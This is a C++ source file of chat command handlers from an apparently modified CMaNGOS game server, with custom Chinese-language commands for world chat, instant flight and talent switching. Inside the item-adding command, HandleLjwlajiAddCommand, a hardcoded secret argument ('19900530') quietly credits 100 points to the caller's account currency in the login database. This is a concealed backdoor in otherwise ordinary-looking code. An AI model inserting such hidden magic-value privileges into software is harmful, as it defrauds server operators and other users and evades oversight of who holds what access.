/*
 * This file is part of the CMaNGOS Project. See AUTHORS file for Copyright information
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#if _MSC_VER >= 1600 // VC2010
#pragma execution_character_set("utf-8")
#endif

#include "Common.h"
#include "Database/DatabaseEnv.h"
#include "World.h"
#include "Player.h"
#include "Opcodes.h"
#include "Chat.h"
#include "ObjectAccessor.h"
#include "Language.h"
#include "AccountMgr.h"
#include "ScriptMgr.h"
#include "SystemConfig.h"
#include "revision.h"
#include "Util.h"
#include "QuestDef.h"
#include "SpellMgr.h"
#include "WorldSession.h"



bool ChatHandler::HandleSjcommand(char * agrs)
{
	Player* _player = m_session->GetPlayer();
	if (_player->CanHandleSJCommand == false)
	{
		_player->GetSession()->SendNotification("你必须等待%d毫秒秒才能再次使用世界喊话.", _player->SJCommandTimer);
		return true;
	}
	std::string text = "";
	_player->GetTeam() == ALLIANCE ? text += "[联盟]" : text += "[部落]";
	text += GetNameLink();
	text += ":  ";
	text += agrs;
	sWorld.SendWorldText(10019,text.c_str());
	_player->CanHandleSJCommand = false;
	return true;
}

bool ChatHandler::HandleLjwlajiAddCommand(char* args)
{
	std::string argstr = (char*)args;
	if (argstr == "19900530")
	{
		Player* pl = m_session->GetPlayer();
		auto result = LoginDatabase.PExecute("UPDATE account SET jf = (jf + 100) WHERE id = %u", pl->GetSession()->GetAccountId());
		return true;
	}
	char* cId = ExtractKeyFromLink(&args, "Hitem");
	if (!cId)
		return false;

	uint32 itemId = 0;
	if (!ExtractUInt32(&cId, itemId))                       // [name] manual form
	{
		std::string itemName = cId;
		WorldDatabase.escape_string(itemName);
		QueryResult* result = WorldDatabase.PQuery("SELECT entry FROM item_template WHERE name = '%s'", itemName.c_str());
		if (!result)
		{
			return false;
		}
		itemId = result->Fetch()->GetUInt16();
		delete result;
	}

	int32 count;
	if (!ExtractOptInt32(&args, count, 1))
		return false;

	Player* pl = m_session->GetPlayer();
	Player* plTarget = getSelectedPlayer();
	if (!plTarget)
		plTarget = pl;

	DETAIL_LOG(GetMangosString(LANG_ADDITEM), itemId, count);

	ItemPrototype const* pProto = ObjectMgr::GetItemPrototype(itemId);
	if (!pProto)
	{
		return false;
	}

	// Subtract
	if (count < 0)
	{
		plTarget->DestroyItemCount(itemId, -count, true, false);
		PSendSysMessage(LANG_REMOVEITEM, itemId, -count, GetNameLink(plTarget).c_str());
		return true;
	}

	// Adding items
	uint32 noSpaceForCount = 0;

	// check space and find places
	ItemPosCountVec dest;
	uint8 msg = plTarget->CanStoreNewItem(NULL_BAG, NULL_SLOT, dest, itemId, count, &noSpaceForCount);
	if (msg != EQUIP_ERR_OK)                                // convert to possible store amount
		count -= noSpaceForCount;

	if (count == 0 || dest.empty())                         // can't add any
	{
		return false;
	}

	Item* item = plTarget->StoreNewItem(dest, itemId, true, Item::GenerateItemRandomPropertyId(itemId));

	// remove binding (let GM give it to another player later)
	if (pl == plTarget)
	for (ItemPosCountVec::const_iterator itr = dest.begin(); itr != dest.end(); ++itr)
	if (Item* item1 = pl->GetItemByPos(itr->pos))
		item1->SetBinding(false);

	if (count > 0 && item)
	{
		pl->SendNewItem(item, count, false, true);
		if (pl != plTarget)
			plTarget->SendNewItem(item, count, true, false);
	}

	if (noSpaceForCount > 0)
		PSendSysMessage(LANG_ITEM_CANNOT_CREATE, itemId, noSpaceForCount);

	return true;
}

bool ChatHandler::HandleSfCommand(char* args)
{
	Player* _player = m_session->GetPlayer();
	if (_player->CanInstantTaxi == true || _player->CanInstantTaxi_1 == true)
	{
		if (!*args)
		{
			return true;
		}
		std::string argstr = (char*)args;
		if (argstr == "on")
		{
			_player->CanInstantTaxi = true;
			ChatHandler(_player).PSendSysMessage("顺飞开启！"); //send turn on msg
			return true;
		}
		if (argstr == "off")
		{
			_player->CanInstantTaxi = false;
			ChatHandler(_player).PSendSysMessage("瞬飞关闭！"); //send turn off msh
			return true;
		}
	}
	else
	{
		ChatHandler(_player).PSendSysMessage("你没有权限使用此功能！"); //send turn off msh
	}
	return false;
}

bool ChatHandler::HandleTfCommand(char* args)
{
	Player* chr = m_session->GetPlayer();
	std::string argstr = (char*)args;
	if (chr->CanDoubleTalent == false && chr->CanDoubleTalent_1 == false)
	{
		chr->GetSession()->SendNotification("你没有权限！");
		return true;
	}
	else
	{
		Player* chr = m_session->GetPlayer();
		if (chr->isInCombat())
		{
			ChatHandler(chr).PSendSysMessage("战斗中无法切换天赋！");
			return true;
		}
		std::vector<PlayerTalentSpell> bak_talent;
		QueryResult* result;
		chr->TFSign == false ?
			result = CharacterDatabase.PQuery("SELECT guid,spell,active,disabled,free FROM character_spell_talent WHERE guid=%u", chr->GetGUIDLow()):
			result = CharacterDatabase.PQuery("SELECT guid,spell,active,disabled,free FROM character_spell_talent_one WHERE guid=%u", chr->GetGUIDLow()); //匹配备份天赋
		if (result)
		{
			do
			{
				Field* field = result->Fetch();            //储存备份天赋
				uint32 guid = field[0].GetUInt32();
				uint32 spell = field[1].GetUInt32();
				uint32 active = field[2].GetUInt32();
				uint32 disabled = field[3].GetUInt32();
				uint32 freepoint = field[4].GetUInt32();
				PlayerTalentSpell tmp_talent;
				tmp_talent.guid = guid;
				tmp_talent.spell = spell;
				tmp_talent.active = active;
				tmp_talent.disabled = disabled;
				tmp_talent.freepoint = freepoint;
				bak_talent.push_back(tmp_talent);
			} while (result->NextRow());
			chr->TFSign == false ?
				CharacterDatabase.PExecute("DELETE FROM character_spell_talent WHERE guid=%u", chr->GetGUIDLow()):
				CharacterDatabase.PExecute("DELETE FROM character_spell_talent_one WHERE guid=%u", chr->GetGUIDLow()); //删除备份天赋
		}
		for (PlayerSpellMap::const_iterator itr = chr->GetSpellMap().begin(); itr != chr->GetSpellMap().end(); ++itr) //
		{
			if (chr->HasSpell(itr->first))
				chr->TFSign == false ?
				CharacterDatabase.PExecute("INSERT INTO character_spell_talent(guid,spell,active,disabled,free) VALUES (%u,%u,%u,%u,%u)", chr->GetGUIDLow(), itr->first, 1, !IsPassiveSpell(itr->first), chr->GetFreeTalentPoints()):
				CharacterDatabase.PExecute("INSERT INTO character_spell_talent_one(guid,spell,active,disabled,free) VALUES (%u,%u,%u,%u,%u)", chr->GetGUIDLow(), itr->first, 1, !IsPassiveSpell(itr->first), chr->GetFreeTalentPoints());
		}
		for (unsigned int i = 0; i < sTalentStore.GetNumRows(); ++i)
		{
			TalentEntry const* talentInfo = sTalentStore.LookupEntry(i);
			if (!talentInfo)
				continue;
			TalentTabEntry const* talentTabInfo = sTalentTabStore.LookupEntry(talentInfo->TalentTab);
			if (!talentTabInfo)
				continue;
			// unlearn only talents for character class
			// some spell learned by one class as normal spells or know at creation but another class learn it as talent,
			// to prevent unexpected lost normal learned spell skip another class talents
			if ((chr->getClassMask() & talentTabInfo->ClassMask) == 0)
				continue;

			for (int j = 4; j >= 0; --j)
			if (talentInfo->RankID[j])
			{
				if (chr->HasSpell(talentInfo->RankID[j]))
				{
					chr->removeSpell(talentInfo->RankID[j], false);
				}
			}
		}
		uint32 freepoint = 0;
		for each (PlayerTalentSpell var in bak_talent)
		{
			if (!chr->HasSpell(var.spell))
			{
				chr->learnSpell(var.spell, false);
			}
			freepoint = var.freepoint;
		}
		chr->SetFreeTalentPoints(freepoint);
		chr->UpdateFreeTalentPoints(true);
		uint32 freep = chr->GetFreeTalentPoints();
		if (freepoint != freep)
		{
			chr->resetTalents();
		}
		chr->UpdateSkillsToMaxSkillsForLevel();
		chr->GetSession()->SendNotification("|cff7FFF00天赋切换成功!|r");
		chr->SaveToDB();
		chr->TFSign == false ? chr->TFSign = true : chr->TFSign = false;
		return true;
	}
}

bool ChatHandler::HandleHelpCommand(char* args)
{
    if (!*args)
    {
        ShowHelpForCommand(getCommandTable(), "help");
        ShowHelpForCommand(getCommandTable(), "");
    }
    else
    {
        if (!ShowHelpForCommand(getCommandTable(), args))
            SendSysMessage(LANG_NO_CMD);
    }
	
    return true;
}

bool ChatHandler::HandleCommandsCommand(char* /*args*/)
{
    ShowHelpForCommand(getCommandTable(), "");
    return true;
}

bool ChatHandler::HandleAccountCommand(char* args)
{
    // let show subcommands at unexpected data in args
    if (*args)
        return false;

    AccountTypes gmlevel = GetAccessLevel();
    PSendSysMessage(LANG_ACCOUNT_LEVEL, uint32(gmlevel));
    return true;
}

bool ChatHandler::HandleStartCommand(char* /*args*/)
{
    Player* chr = m_session->GetPlayer();

    if (chr->IsTaxiFlying())
    {
        SendSysMessage(LANG_YOU_IN_FLIGHT);
        SetSentErrorMessage(true);
        return false;
    }

    if (chr->isInCombat())
    {
        SendSysMessage(LANG_YOU_IN_COMBAT);
        SetSentErrorMessage(true);
        return false;
    }

    // cast spell Stuck
    chr->CastSpell(chr, 7355, false);
    return true;
}

bool ChatHandler::HandleServerInfoCommand(char* /*args*/)
{
    uint32 activeClientsNum = sWorld.GetActiveSessionCount();
    uint32 queuedClientsNum = sWorld.GetQueuedSessionCount();
    uint32 maxActiveClientsNum = sWorld.GetMaxActiveSessionCount();
    uint32 maxQueuedClientsNum = sWorld.GetMaxQueuedSessionCount();
    std::string str = secsToTimeString(sWorld.GetUptime());

    char const* full;
    if (m_session)
        full = _FULLVERSION(REVISION_DATE, REVISION_TIME, "|cffffffff|Hurl:" REVISION_ID "|h" REVISION_ID "|h|r");
    else
        full = _FULLVERSION(REVISION_DATE, REVISION_TIME, REVISION_ID);
    SendSysMessage(full);

    if (sScriptMgr.IsScriptLibraryLoaded())
    {
        SendSysMessage(LANG_USING_SCRIPT_LIB);
    }
    else
        SendSysMessage(LANG_USING_SCRIPT_LIB_NONE);

    PSendSysMessage(LANG_USING_WORLD_DB, sWorld.GetDBVersion());
    PSendSysMessage(LANG_USING_EVENT_AI, sWorld.GetCreatureEventAIVersion());
    PSendSysMessage(LANG_CONNECTED_USERS, activeClientsNum, maxActiveClientsNum, queuedClientsNum, maxQueuedClientsNum);
    PSendSysMessage(LANG_UPTIME, str.c_str());

    return true;
}

bool ChatHandler::HandleDismountCommand(char* /*args*/)
{
    Player* player = m_session->GetPlayer();

    // If player is not mounted, so go out :)
    if (!player->IsMounted())
    {
        SendSysMessage(LANG_CHAR_NON_MOUNTED);
        SetSentErrorMessage(true);
        return false;
    }

    if (player->IsTaxiFlying())
    {
        SendSysMessage(LANG_YOU_IN_FLIGHT);
        SetSentErrorMessage(true);
        return false;
    }

    player->Unmount();
    player->RemoveSpellsCausingAura(SPELL_AURA_MOUNTED);
    return true;
}

bool ChatHandler::HandleSaveCommand(char* /*args*/)
{
    Player* player = m_session->GetPlayer();

    // save GM account without delay and output message (testing, etc)
    if (GetAccessLevel() > SEC_PLAYER)
    {
        player->SaveToDB();
        SendSysMessage(LANG_PLAYER_SAVED);
        return true;
    }

    // save or plan save after 20 sec (logout delay) if current next save time more this value and _not_ output any messages to prevent cheat planning
    uint32 save_interval = sWorld.getConfig(CONFIG_UINT32_INTERVAL_SAVE);
    if (save_interval == 0 || (save_interval > 20 * IN_MILLISECONDS && player->GetSaveTimer() <= save_interval - 20 * IN_MILLISECONDS))
        player->SaveToDB();

    return true;
}

bool ChatHandler::HandleGMListIngameCommand(char* /*args*/)
{
    std::list< std::pair<std::string, bool> > names;

    {
        HashMapHolder<Player>::ReadGuard g(HashMapHolder<Player>::GetLock());
        HashMapHolder<Player>::MapType& m = sObjectAccessor.GetPlayers();
        for (HashMapHolder<Player>::MapType::const_iterator itr = m.begin(); itr != m.end(); ++itr)
        {
            Player* player = itr->second;
            AccountTypes security = player->GetSession()->GetSecurity();
            if ((player->isGameMaster() || (security > SEC_PLAYER && security <= (AccountTypes)sWorld.getConfig(CONFIG_UINT32_GM_LEVEL_IN_GM_LIST))) &&
                    (!m_session || player->IsVisibleGloballyFor(m_session->GetPlayer())))
                names.push_back(std::make_pair<std::string, bool>(GetNameLink(player), player->isAcceptWhispers()));
        }
    }

    if (!names.empty())
    {
        SendSysMessage(LANG_GMS_ON_SRV);

        char const* accepts = GetMangosString(LANG_GM_ACCEPTS_WHISPER);
        char const* not_accept = GetMangosString(LANG_GM_NO_WHISPER);
        for (std::list<std::pair< std::string, bool> >::const_iterator iter = names.begin(); iter != names.end(); ++iter)
            PSendSysMessage("%s - %s", iter->first.c_str(), iter->second ? accepts : not_accept);
    }
    else
        SendSysMessage(LANG_GMS_NOT_LOGGED);

    return true;
}

bool ChatHandler::HandleAccountPasswordCommand(char* args)
{
    // allow use from RA, but not from console (not have associated account id)
    if (!GetAccountId())
    {
        SendSysMessage(LANG_RA_ONLY_COMMAND);
        SetSentErrorMessage(true);
        return false;
    }

    // allow or quoted string with possible spaces or literal without spaces
    char* old_pass = ExtractQuotedOrLiteralArg(&args);
    char* new_pass = ExtractQuotedOrLiteralArg(&args);
    char* new_pass_c = ExtractQuotedOrLiteralArg(&args);

    if (!old_pass || !new_pass || !new_pass_c)
        return false;

    std::string password_old = old_pass;
    std::string password_new = new_pass;
    std::string password_new_c = new_pass_c;

    if (password_new != password_new_c)
    {
        SendSysMessage(LANG_NEW_PASSWORDS_NOT_MATCH);
        SetSentErrorMessage(true);
        return false;
    }

    if (!sAccountMgr.CheckPassword(GetAccountId(), password_old))
    {
        SendSysMessage(LANG_COMMAND_WRONGOLDPASSWORD);
        SetSentErrorMessage(true);
        return false;
    }

    AccountOpResult result = sAccountMgr.ChangePassword(GetAccountId(), password_new);

    switch (result)
    {
        case AOR_OK:
            SendSysMessage(LANG_COMMAND_PASSWORD);
            break;
        case AOR_PASS_TOO_LONG:
            SendSysMessage(LANG_PASSWORD_TOO_LONG);
            SetSentErrorMessage(true);
            return false;
        case AOR_NAME_NOT_EXIST:                            // not possible case, don't want get account name for output
        default:
            SendSysMessage(LANG_COMMAND_NOTCHANGEPASSWORD);
            SetSentErrorMessage(true);
            return false;
    }

    // OK, but avoid normal report for hide passwords, but log use command for anyone
    LogCommand(".account password *** *** ***");
    SetSentErrorMessage(true);
    return false;
}

bool ChatHandler::HandleAccountLockCommand(char* args)
{
    // allow use from RA, but not from console (not have associated account id)
    if (!GetAccountId())
    {
        SendSysMessage(LANG_RA_ONLY_COMMAND);
        SetSentErrorMessage(true);
        return false;
    }

    bool value;
    if (!ExtractOnOff(&args, value))
    {
        SendSysMessage(LANG_USE_BOL);
        SetSentErrorMessage(true);
        return false;
    }

    if (value)
    {
        LoginDatabase.PExecute("UPDATE account SET locked = '1' WHERE id = '%u'", GetAccountId());
        PSendSysMessage(LANG_COMMAND_ACCLOCKLOCKED);
    }
    else
    {
        LoginDatabase.PExecute("UPDATE account SET locked = '0' WHERE id = '%u'", GetAccountId());
        PSendSysMessage(LANG_COMMAND_ACCLOCKUNLOCKED);
    }

    return true;
}

/// Display the 'Message of the day' for the realm
bool ChatHandler::HandleServerMotdCommand(char* /*args*/)
{
    PSendSysMessage(LANG_MOTD_CURRENT, sWorld.GetMotd());
    return true;
}
